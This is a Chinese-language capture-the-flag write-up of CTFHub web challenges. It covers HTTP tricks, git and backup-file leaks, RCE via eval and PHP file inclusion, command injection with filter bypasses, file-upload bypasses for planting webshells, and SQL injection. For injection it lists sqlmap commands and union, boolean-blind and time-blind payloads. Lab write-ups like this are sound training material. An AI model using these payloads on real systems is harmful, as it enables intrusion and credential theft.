# CTFHUB刷题Web
### Web前置技能-HTTP协议
##### 请求方法
HTTP/1.1协议中共定义了八种请求方法: 常用的有GET,POST</br>
本题需要使用`curl`指令,列出本题用的到的参数([其他参数](https://www.ruanyifeng.com/blog/2019/09/curl-reference.html))</br>
>`-X`参数指定 HTTP 请求的方法

>`-v`参数输出通信的整个过程

![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image.png)
##### 302跳转
bp抓包分析:</br>网页主页是/index.html当点击[GivemeFlag]会跳转到/index.php
但响应显示
```
HTTP/1.1 302 Moved Temporarily
Location: /index.html
```
所以会重定向到/index.html
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-1.png)
##### Cookie
Cookie字段原本为admin=0,修改为admin=1即可
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-4.png)
##### 基础认证
输入id为admin,密码是111,连接起来形成 "admin:111" 这样的字符串</br>
把字符串进行 Base64 编码,并在字符串前面拼接 Baisc ,最后把这个字符串写入首部字段 Authorization 后,发送请求
```HTTP
Authorization: Basic YWRtaW46MTEx
```
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-5.png)
导入题目提供的字典并添加前缀`admin:`,然后进行base64编码,爆破获得flag
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-7.png)
###### 响应包源代码
ctrl+u查看源码
### 信息泄露
#### 目录遍历
挨个点,flag在`/flag_in_here/3/4/flag.txt`目录下
#### PHPINFO
在页面搜索flag
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-8.png)
#### 备份文件下载
##### 网站源码
目录扫描出`www.zip`压缩包里有`flag_2385019699.txt`但内容不是flag</br>访问`http://……ctfhub.com:10800/flag_2385019699.txt`得到flag
##### bak文件
提示flag在index.php的源码里,但访问后未出现,考虑到bak是备份文件常用后缀所以尝试/index.php.bak</br>下载文件打开得到flag
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-9.png)
>附前几天查到的:网页文件备份常见后缀
>网站存在备份文件,常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf”
##### vim缓存
在使用vim修改了文件内容但没有正常保存退出时会创建临时缓存文件</br>
以 index.php 为例：</br>
第一次产生的交换文件名为 .index.php.swp</br>
第二次产生的交换文件名为 .index.php.swo</br>
第三次产生的交换文件名为 .index.php.swn
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-10.png)
##### .DS_Store
`.DS_Store` 是 Mac OS 保存文件夹的自定义属性的隐藏文件,通过.DS_Store可以知道这个目录里面所有文件的清单
下载`.DS_Store`文件,用kali打开
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-11.png)
访问/15ff15a92fd06e48f96c54b7d7d22ae1.txt目录,获得flag
#### Git泄露
##### Log
Githack.py要在python2下运行</br>
先下载泄露的git文件
>python2 Githack.py http://challenge-358cafc79eea833b.sandbox.ctfhub.com:10800/.git/

![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-12.png)

然后先

>git log

再

>git diff xxxxxxxxxxx

逐一尝试
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-14.png)
##### Stash
>git stash list

![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-16.png)

>git stash show -p stash@{0}

![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-15.png)
##### Index
cd到下载目录下发现文件直接cat
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-17.png)
#### SVN泄露
[参考wp](https://blog.csdn.net/m0_51191308/article/details/127293812)


### 密码口令
#### 弱口令
抓包用bp进行爆破
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-18.png)
#### 默认口令
百度搜索`北京亿中邮默认口令`就能拿到账号密码
### RCE
#### eval执行
无任何waf,直接传参
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-19.png)
得知flag文件的名字`flag_9750`
![alt text](https://gitee.com/SSSSSHONE/ss/raw/master/image-20.png)
```
payload:
http://challenge-7ba8f901ca14eedb.sandbox.ctfhub.com:10800/?cmd=system(%22ls%20/%22);
http://challenge-7ba8f901ca14eedb.sandbox.ctfhub.com:10800/?cmd=system(%22cat%20/flag_9750%22);
```
#### 文件包含
虽然sell是txt文档,但当它被包含进php文件就会被当作php执行  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016184140.png)
payload:`?file=shell.txt&ctfhub=system("cat%20/flag");`
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016184303.png)
#### php://input
本题使用php伪协议的`php://input`协议,`input`会执行POST传参的代码  
构建payload:
```
?file=php://input
<?php system("cat /flag_19026");?>
```
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016192319.png)
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016192400.png)
#### 读取源代码
本题知道flag文件的位置和名字所以可以使用`php://filter`  
payload: `http://challenge-b0f2136ee5f68477.sandbox.ctfhub.com:10800/?file=php://filter/read=convert.base64-encode/resource=/flag`
base64解码得到flag
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016193127.png)
#### 远程包含
同[php://input]  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016194416.png)
#### 命令注入
输入的命令都会被执行,执行结果被输入到数组后输出  
ls后没找到叫flag的文件,比较可疑的文件是 `/19288840219209.php`  
payload: `www.baudu.com;cat /19288840219209.php;`
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016171947.png)
但是文件似乎是空的,最后发现flag被注释了
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016172049.png)
#### 过滤cat
cat被过滤可以使用less、more、tail等命令来代替cat
payload: `www.baidu.com;less flag_11782911715210.php`
flag依旧被注释了
#### 过滤空格
使用`${IFS}`绕过,flag被注释了  
列出一些其他绕过空格的方式:
空格过滤绕过：
```
1. 大括号{}:  
{cat,flag.php}  

2. $IFS代替空格{}
$IFS$9,${IFS},$IFS这三个都行  
Linux下有一个特殊的环境变量叫做IFS,叫做内部字段分隔符 (internal field separator)。  
?cmd=ls$IFS-I  
单纯$IFS2,IFS2被bash解释器当做变量名,输不出来结果,加一个{}就固定了变量名  
?cmd=ls${IFS}-l  
$IFS$9后面加个$与{}类似,起截断作用,$9是当前系统shell进程第九个参数持有者始终为空字符串。  
?cmd=ls${IFS}$9-l 

3. 重定向字符<,<>  

4. %09绕过(相当于Tab键)  
```
#### 过滤目录分隔符
ls发现当前目录下的/flag_is_here文件夹,ls此文件夹发现flag文件,cat即可
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016174122.png)  
flag被注释
#### 过滤运算符
这题好像也没用到运算符……  
先ls看文件名再cat
payload: `www.baidu.com;cat flag_187641964115100.php`
#### 综合过滤练习
这个正则表达式过滤了5个符号和3个单词:
|
&   
;   
空格   
/   
cat、flag、ctfhub  
没有  `分号,管道符,and符号`  我们就不能执行多行命令,可以用`%0a`绕过,表示换行   
空格可用`${IFS}`绕过  
过滤`cat`可以用`less`代替  
flag可以用`*`通配符匹配  
payload: `127.0.0.1%0acd${IFS}*here%0aless${IFS}*0.php`  
flag在注释中  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016183836.png)
### 文件上传
#### 无验证
上传一句话木马,用蚁剑连接
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016195104.png)
#### 前端验证
禁用js即可
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016195618.png)
蚁剑连接  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016195822.png)
#### MIME绕过
bp抓包,修改`Content-Type:`为`image/png`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016200324.png)
即可成功上传`.php`后缀的木马
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016200101.png)
蚁剑连接  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016200509.png)
#### 00截断
bp抓包,修改文件名为`c.php%00.png`,修改url为`?road=/var/www/html/upload/c.php%00`  
低版本php会忽略`%00`后的内容
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016202217.png)
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016200731.png)
#### 双写后缀
bp抓包,修改文件名为`c.pphphp`  
删去一个`php`后剩下的字符又组合出了`php`
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016203137.png)
#### 文件头检查
上传一个图片马`mm.png`,bp抓包修改文件名为`mm/php`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016204908.png)
#### .htaccess
先上传一个`.htaccess`文件  
内容为
```http
AddType application/x-httpd-php .png
```
作用是把`.png`文件解析为`.php`来执行  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016205817.png)
再上传后缀为`.png`的图片马,成功连接  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241016210046.png)
### SQL注入
#### 整数型注入
python sqlmap.py -r “1.txt”                   #检测注入点是否可用
python sqlmap.py -r “1.txt” --dbs             #爆出该msql中所有数据库名称
python sqlmap.py -r “1.txt” --current-db      #web当前使用的数据库
python sqlmap.py -r “1.txt” --current-user    #web数据库使用账户
python sqlmap.py -r “1.txt” --users           #列出sql所有用户
python sqlmap.py -r “1.txt” --passwords       #数据库账户与密码
python sqlmap.py -r “1.txt” --tbales          #输出所有的表
python sqlmap.py -r “1.txt” -D --tables       #根据数据库名输出所有的表
python sqlmap.py -r “1.txt” -D -T --columns   #爆出字段名(列名)
python sqlmap.py -r “1.txt” -D -T -C”username,realname,password” --dump


#### 有回显位->联合注入:
```sql
?id=1 order by 3--+查看表格一共有几列,逐渐增加3的大小直到报错
?id=-1 union select 1,2,3--+查看表格的哪几列会在页面显示
?id=-1 union select 1,database(),version() --+database查询库名,version查询表名
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+security为目标库名,查询出的内容为security库下的所有表名
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+user为目标表名,查询出的内容为user表下的所有字段名
?id=-1 union select 1,2,group_concat(username ,id , password) from users--+user为目标表名,username id password为其下的目标字段名,查询结果为字段下的实际内容。这里加id是因为查询出的username和password无间隔,不好区分
```

#### 回显没有数据,只显示对错->布尔盲注:
布尔盲注主要用到length(),ascii() ,substr()这三个函数，首先通过length()函数确定长度再通过另外两个确定具体字符是什么。布尔盲注向对于联合注入来说需要花费大量时间。  
>ascii码尝试范围32~127
```sql
?id=1''and length((select database()))>9--+  
--+大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4
?id=1''and ascii(substr((select database()),1,1))=115--+
--+substr("78909",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
 
?id=1''and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13--+
--+判断所有表名字符长度。
?id=1''and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+
--+逐一判断表名
 
?id=1''and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20--+
--+判断所有字段名的长度
?id=1''and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+
--+逐一判断字段名。
 

?id=1'' and length((select group_concat(username,password) from users))>109--+
--+判断字段内容长度
?id=1'' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+
--+逐一检测内容。
```

#### 页面既无回显也无报错->时间盲注:
如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数。if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串

```sql
?id=1'' and if(1=1,sleep(5),1)--+
--+判断参数构造。
?id=1''and if(length((select database()))>9,sleep(5),1)--+
--+判断数据库名长度
 
?id=1''and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
--+逐一判断数据库字符
?id=1''and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
--+判断所有表名长度
 
?id=1''and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
--+逐一判断表名
?id=1''and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
--+判断所有字段名的长度
 
?id=1''and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
--+逐一判断字段名
?id=1'' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
--+判断字段内容长度

?id=1'' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
--+逐一检测内容。
```


库名flag
表明flag
字段名flag
字段内容长度32

ctfhub{}
56 97 98 102 48 48 52 53 52 98 48 98 52 51 53 56 52 48 48 54 50 50 98 97 